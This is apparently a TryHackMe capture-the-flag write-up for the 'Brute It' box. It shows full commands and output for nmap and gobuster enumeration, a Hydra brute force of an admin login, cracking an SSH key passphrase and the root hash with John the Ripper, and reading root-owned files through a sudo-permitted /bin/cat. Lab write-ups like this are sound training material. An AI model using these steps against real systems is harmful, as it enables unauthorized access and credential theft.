ip address: 10.10.241.45

## NMAP ENUMERATION:
```r
nmap -sV -A -sC 10.10.241.45 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 08:24 EST
Nmap scan report for 10.10.241.45
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/15%OT=22%CT=1%CU=38397%PV=Y%DS=2%DC=T%G=Y%TM=65CE
OS:10B0%P=x86_64-pc-linux-gnu)SEQ(SP=F9%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=FA%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW7%O2=M508ST1
OS:1NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4
OS:B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M5
OS:08NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   111.53 ms 10.9.0.1
2   118.25 ms 10.10.241.45

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
```

``Discovered two port:``
ssh on Port 22
http on port 80, running on Apache httpd 2.4.29

``Whatweb:``
```r
whatweb http://10.10.241.45      
http://10.10.241.45 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.241.45], Title[Apache2 Ubuntu Default Page: It works]
```

## Gobuster subdirectory enumeration:
```r
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.241.45
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.241.45
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.241.45/admin/]
Progress: 20747 / 220561 (9.41%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 20777 / 220561 (9.42%)
===============================================================
Finished
===============================================================
```

```r
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Admin Login Page</title>
</head>
<body>
    <div class="main">
        <form action="" method="POST">
            <h1>LOGIN</h1>

            
            <p>Username or password invalid</p>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>
```
In the source-code, we discovered two name: ``John and admin``

## BruteForce Login using HYDRA
```r
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.222.244 http-post-form "/admin/:user=^USER^&pass=^PASS^&login:Username or password invalid"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-15 18:53:32
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.222.244:80/admin/:user=^USER^&pass=^PASS^&login:Username or password invalid
[80][http-post-form] host: 10.10.222.244   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-15 18:53:56
```
``Found``- admin:xavier

![[Pasted image 20240215190008.png]]
``Found:`` RSA private key

Save the RSA to a file called ``id_rsa`` and change permission: ``chmod 400 id_rsa``
Let use that private key to log in as ``John``

```r
ssh -i id_rsa john@10.10.222.244
The authenticity of host '10.10.222.244 (10.10.222.244)' can't be established.
ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.222.244' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```
Oh wow, a passphrase is needed: Let us brute force the passphrase using ``ssh2john``

- Locate ``ssh2john``
- Use ssh2john to convert the id_rsa file to a file format used by ``John The Ripper``
- Use John to bruteforce the ``id_rsa.hash`` to reveal the passphrase
```r
locate ssh2john.py     
/usr/share/john/ssh2john.py
➜  TryHackMe python ssh2john.py id_rsa > id_rsa.hash
python: can't open file 'ssh2john.py': [Errno 2] No such file or directory
➜  TryHackMe python3 ssh2john.py id_rsa > id_rsa.hash
python3: can't open file '/root/TryHackMe/ssh2john.py': [Errno 2] No such file or directory
➜  TryHackMe python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
➜  TryHackMe john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2024-02-15 19:12) 14.28g/s 1037Kp/s 1037Kc/s 1037KC/s saloni..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
``Found: passphrase:`` rockinroll

Now we found the passphrase, let login in again
``ssh -i id_rsa john@10.10.222.244``
![[Pasted image 20240215192023.png]]

```r
john@bruteit:~$ ls -la
total 40
drwxr-xr-x 5 john john 4096 Sep 30  2020 .
drwxr-xr-x 4 root root 4096 Aug 28  2020 ..
-rw------- 1 john john  394 Sep 30  2020 .bash_history
-rw-r--r-- 1 john john  220 Aug 16  2020 .bash_logout
-rw-r--r-- 1 john john 3771 Aug 16  2020 .bashrc
drwx------ 2 john john 4096 Aug 16  2020 .cache
drwx------ 3 john john 4096 Aug 16  2020 .gnupg
-rw-r--r-- 1 john john  807 Aug 16  2020 .profile
drwx------ 2 john john 4096 Aug 16  2020 .ssh
-rw-r--r-- 1 john john    0 Aug 16  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root root   33 Aug 16  2020 user.txt
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
```
Found the user.txt file

## Privilege Escalation:
Let use ``sudo -l`` to see whether john user can run the sudo command

```r
John@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
The john is allow to be root in the ``/bin/cat ``folder

so let's try so few commands
```r
LFILE=/root/root.txt
john@bruteit:~$ sudo /bin/cat "$LFILE"
THM{pr1v1l3g3_3sc4l4t10n}
```
We were able to save a path to the root folder and read the root.txt file using ``sudo /bin/cat "file-name"``

To get the root password
we save both the ``passwd`` file and ``shadow`` file and use the unshadow command to output the two files into ``password.txt``

```r      
➜  nano passwd           
➜  nano shadow           
➜  unshadow passwd shadow > password.txt
```
Then use ``John The Ripper`` to brute-force the root user account

```r
john --wordlist=/usr/share/wordlists/rockyou.txt password.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
1g 0:00:01:03 0.65% (ETA: 22:22:46) 0.01567g/s 1733p/s 3474c/s 3474C/s munster1..liljess
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```
``Root password``: football
